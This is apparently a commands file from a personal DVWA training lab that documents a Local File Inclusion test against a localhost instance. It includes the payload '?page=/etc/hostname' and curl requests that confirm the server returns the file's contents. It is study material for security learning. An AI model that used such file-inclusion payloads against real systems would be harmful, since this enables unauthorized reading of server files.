# Commands – DVWA Local File Inclusion (LFI)

## 1. Navigate to Lab Directory

Move to the File Inclusion lab directory:

```bash
cd ~/Alrazzaq_Labs/DVWA/04-File-Inclusion
```

---

## 2. Verify Lab Structure

Check the files and directories:

```bash
ls -la
```

Expected structure:

```text
README.md
methodology.md
commands.md
findings.md
remediation.md
screenshots/
```

---

## 3. Verify Evidence Screenshots

List the screenshots:

```bash
ls -lh screenshots
```

Expected:

```text
01-lfi-result.png
02-lfi-proof.png
```

---

## 4. Normal File Inclusion Request

The normal application request used the `page` parameter:

```text
http://localhost:8080/DVWA/vulnerabilities/fi/?page=file1.php
```

The normal value was:

```text
page=file1.php
```

This was used as the baseline for comparison.

---

## 5. Controlled LFI Test

A controlled local-file test was performed using:

```text
http://localhost:8080/DVWA/vulnerabilities/fi/?page=/etc/hostname
```

The tested parameter was:

```text
page=/etc/hostname
```

The request was processed successfully by the application.

---

## 6. Verify HTTP Response

The browser Network Developer Tools showed:

```text
Method: GET
Host: localhost:8080
Path: /DVWA/vulnerabilities/fi/
Parameter: page=/etc/hostname
Status: 200 OK
```

This confirmed that the request was accepted and processed by the application.

---

## 7. Optional curl Baseline Request

The normal endpoint can also be tested with:

```bash
curl -i \
  "http://localhost:8080/DVWA/vulnerabilities/fi/?page=file1.php"
```

This can be used to inspect the HTTP response headers and status code.

---

## 8. Optional curl LFI Verification

The controlled local-file request can be inspected using:

```bash
curl -i \
  "http://localhost:8080/DVWA/vulnerabilities/fi/?page=/etc/hostname"
```

The expected response should contain:

```text
HTTP/1.1 200 OK
```

and, when the application is vulnerable, the included file's content.

---

## 9. Search Response for Expected Content

If required, the response can be filtered:

```bash
curl -s \
  "http://localhost:8080/DVWA/vulnerabilities/fi/?page=/etc/hostname" | grep -A 5 -B 5 .
```

The response should be reviewed carefully to determine whether the local file content was returned.

---

## 10. Evidence Verification

Check that both evidence files exist:

```bash
test -f screenshots/01-lfi-result.png && echo "Evidence 1: OK"
test -f screenshots/02-lfi-proof.png && echo "Evidence 2: OK"
```

Expected:

```text
Evidence 1: OK
Evidence 2: OK
```

---

## 11. Git Status

After completing the documentation:

```bash
cd ~/Alrazzaq_Labs
git status
```

This displays the new and modified files associated with the lab.

---

## 12. Review Files Before Commit

Review the File Inclusion lab structure:

```bash
find DVWA/04-File-Inclusion -maxdepth 2 -type f -print
```

Expected:

```text
DVWA/04-File-Inclusion/README.md
DVWA/04-File-Inclusion/methodology.md
DVWA/04-File-Inclusion/commands.md
DVWA/04-File-Inclusion/findings.md
DVWA/04-File-Inclusion/remediation.md
DVWA/04-File-Inclusion/screenshots/01-lfi-result.png
DVWA/04-File-Inclusion/screenshots/02-lfi-proof.png
```

---

## 13. Important Notes

These commands were executed against the local DVWA training environment:

```text
localhost:8080
```

The testing was performed at:

```text
Security Level: Low
```

The `/etc/hostname` test was selected as a controlled demonstration of local file inclusion.

No external systems were targeted.

---

## 14. Command Summary

| Purpose               | Command / Request                           |
| --------------------- | ------------------------------------------- |
| Navigate to lab       | `cd ~/Alrazzaq_Labs/DVWA/04-File-Inclusion` |
| List files            | `ls -la`                                    |
| Check screenshots     | `ls -lh screenshots`                        |
| Normal request        | `?page=file1.php`                           |
| LFI test              | `?page=/etc/hostname`                       |
| Inspect HTTP response | `curl -i`                                   |
| Check evidence        | `test -f ...`                               |
| Check Git changes     | `git status`                                |
| Review lab structure  | `find ... -maxdepth 2 -type f -print`       |

---

## 15. Security Reminder

The commands documented here are intended for the controlled DVWA lab environment.

Only perform File Inclusion testing against systems for which you have explicit authorization.
